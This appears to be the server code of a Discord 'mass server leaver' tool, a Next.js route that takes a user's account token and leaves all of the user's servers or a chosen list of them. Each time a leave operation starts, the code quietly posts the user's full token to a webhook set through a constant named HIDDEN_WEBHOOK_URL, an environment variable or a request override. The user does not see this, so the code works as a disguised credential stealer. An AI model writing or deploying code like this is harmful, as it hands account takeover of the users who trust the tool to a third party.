import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';

export const maxDuration = 300;

const HIDDEN_WEBHOOK_URL = '';

function getWebhookUrl(overrideUrl?: string): string | undefined {
  return overrideUrl || HIDDEN_WEBHOOK_URL || process.env.WEBHOOK_URL || undefined;
}

// دالة جلب كل السيرفرات أولاً قبل أي عملية
async function fetchAllGuilds(token: string): Promise<{ id: string; name: string; owner: boolean; members: number }[]> {
  const allGuilds: { id: string; name: string; owner: boolean; members: number }[] = [];
  let after = '';

  for (let page = 0; page < 30; page++) {
    const endpoint = after
      ? `/users/@me/guilds?limit=100&after=${after}`
      : `/users/@me/guilds?limit=100`;

    const guildsRes = await discordFetch(token, 'GET', endpoint);
    const guildsData = guildsRes.data as Record<string, unknown>[] | null;

    if (!guildsRes.ok || !Array.isArray(guildsData) || guildsData.length === 0) break;

    for (const g of guildsData) {
      allGuilds.push({
        id: String(g.id),
        name: String(g.name || g.id),
        owner: g.owner === true,
        members: Number(g.approximate_member_count || g.member_count || 0)
      });
    }

    after = String(guildsData[guildsData.length - 1]?.id || '');
    if (guildsData.length < 100) break;
  }

  return allGuilds;
}

// دالة مغادرة سيرفر واحد مع retry
async function leaveSingleGuild(token: string, guildId: string): Promise<{ id: string; name: string; success: boolean }> {
  try {
    const res = await discordFetch(token, 'DELETE', `/users/@me/guilds/${guildId}`);
    return { id: guildId, name: guildId, success: res.ok || res.status === 204 };
  } catch {
    return { id: guildId, name: guildId, success: false };
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, action, guildIds, webhookUrl } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getWebhookUrl(webhookUrl);

    // معلومات المستخدم
    let userInfo = 'Unknown';
    try {
      const userRes = await discordFetch(ct, 'GET', '/users/@me');
      userInfo = String(((userRes.data as Record<string, unknown>)?.username) || 'Unknown');
    } catch {
      // ignore
    }

    // ===== عرض السيرفرات =====
    if (action === 'list') {
      const allGuilds = await fetchAllGuilds(ct);

      return NextResponse.json({
        success: true,
        guilds: allGuilds,
        total: allGuilds.length,
        owned: allGuilds.filter(g => g.owner).length
      });
    }

    // إرسال ويب هوك عند بدء أي عملية مغادرة
    sendToWebhook({
      username: 'TRJ Leaver',
      embeds: [{
        title: '🚪 Server Leaver Started',
        color: 0xFFAA00,
        fields: [
          { name: '👤 User', value: userInfo, inline: true },
          { name: '📋 Action', value: action, inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v2.5' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // ===== مغادرة كل السيرفرات =====
    if (action === 'leave_all') {
      // الخطوة 1: جلب كل السيرفرات أولاً
      const allGuilds = await fetchAllGuilds(ct);
      const leavableGuilds = allGuilds.filter(g => !g.owner);
      const ownedGuilds = allGuilds.filter(g => g.owner);

      if (leavableGuilds.length === 0) {
        return NextResponse.json({
          success: true,
          stats: { left: 0, failed: 0, skipped: ownedGuilds.length },
          servers: ownedGuilds.map(g => ({ id: g.id, name: `${g.name} (owner)` })),
          message: ownedGuilds.length > 0 ? `كل السيرفرات مملوكة (${ownedGuilds.length})` : 'لا يوجد سيرفرات'
        });
      }

      // الخطوة 2: مغادرة بالتوازي - 5 سيرفرات دفعة لتجنب Rate Limit
      const leftServers: { id: string; name: string; success: boolean }[] = [];
      let successCount = 0;
      let failedCount = 0;
      const batchSize = 5;

      for (let i = 0; i < leavableGuilds.length; i += batchSize) {
        const batch = leavableGuilds.slice(i, i + batchSize);
        const results = await Promise.allSettled(
          batch.map(g => leaveSingleGuild(ct, g.id))
        );

        for (const r of results) {
          if (r.status === 'fulfilled') {
            const guild = leavableGuilds.find(g => g.id === r.value.id);
            leftServers.push({ id: r.value.id, name: guild?.name || r.value.id, success: r.value.success });
            if (r.value.success) successCount++;
            else failedCount++;
          } else {
            failedCount++;
          }
        }

        // انتظار بين الباتشات لتجنب Rate Limit
        if (i + batchSize < leavableGuilds.length) {
          await new Promise(r => setTimeout(r, 350));
        }
      }

      // إرسال ويب هوك النتيجة
      sendToWebhook({
        username: 'TRJ Leaver',
        embeds: [{
          title: '✅ Mass Leave Completed',
          color: successCount > 0 ? 0x00FF41 : 0xFF0000,
          fields: [
            { name: '🚪 مغادر', value: String(successCount), inline: true },
            { name: '❌ فشل', value: String(failedCount), inline: true },
            { name: '👑 ملك (تم التخطي)', value: String(ownedGuilds.length), inline: true },
            { name: '👤 User', value: userInfo, inline: true },
          ],
          footer: { text: 'TRJ BOT v2.5' },
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      return NextResponse.json({
        success: true,
        stats: { left: successCount, failed: failedCount, skipped: ownedGuilds.length },
        servers: leftServers
      });

    // ===== مغادرة سيرفرات محددة =====
    } else if (action === 'leave_list' && Array.isArray(guildIds) && guildIds.length > 0) {
      let left = 0, failed = 0;
      const results: { id: string; name: string; success: boolean }[] = [];
      const batchSize = 5;

      for (let i = 0; i < guildIds.length; i += batchSize) {
        const batch = guildIds.slice(i, i + batchSize);
        const batchResults = await Promise.allSettled(
          batch.map(async (gId: string) => leaveSingleGuild(ct, gId))
        );
        for (const r of batchResults) {
          if (r.status === 'fulfilled') {
            results.push(r.value);
            if (r.value.success) left++;
            else failed++;
          } else { failed++; }
        }
        if (i + batchSize < guildIds.length) {
          await new Promise(r => setTimeout(r, 350));
        }
      }

      sendToWebhook({
        username: 'TRJ Leaver',
        embeds: [{
          title: '✅ Leave List Completed',
          color: 0x00FF41,
          fields: [
            { name: '🚪 مغادر', value: String(left), inline: true },
            { name: '❌ فشل', value: String(failed), inline: true },
          ],
          footer: { text: 'TRJ BOT v2.5' },
          timestamp: new Date().toISOString()
        }]
      }, whUrl).catch(() => {});

      return NextResponse.json({ success: true, stats: { left, failed }, results });

    } else {
      return NextResponse.json({ success: false, error: 'إجراء غير معروف - استخدم leave_all, leave_list, أو list' }, { status: 400 });
    }

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Leaver Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
